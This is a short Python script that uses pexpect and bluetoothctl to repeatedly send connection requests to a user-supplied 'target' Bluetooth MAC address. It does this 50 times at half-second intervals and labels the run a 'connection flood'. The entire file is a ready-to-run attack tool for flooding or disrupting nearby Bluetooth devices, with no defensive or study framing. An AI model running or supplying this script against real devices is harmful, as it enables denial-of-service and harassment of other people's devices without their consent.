import pexpect
import time
import sys

def flood_connect(mac, attempts=50, delay=0.5):
    print(f"---   Starting connection flood to {mac}   ---")
    for i in range(attempts):
        print(f"[{i+1}] Attempting to connect -")

        flood = pexpect.spawn("bluetoothctl", encoding='utf-8', timeout=5)
        try:
            flood.expect("#")
            flood.sendline("power on")
            flood.expect("#")
            flood.sendline("agent on")
            flood.expect("#")
            flood.sendline("default-agent")
            flood.expect("#")
            flood.sendline(f"connect {mac}")
            flood.expect("#", timeout=3)
            response = flood.before.strip()
            print(response)
        except Exception as e:
            print(f"Attempt {i+1} failed: {e}")
        finally:
            flood.sendline("exit")
            flood.close()

        time.sleep(delay)  # Small pause between attempts

    print("\n---   Flood complete.   ---")

if __name__ == "__main__":
    mac = input("Enter the MAC address of the target device: ")
    flood_connect(mac)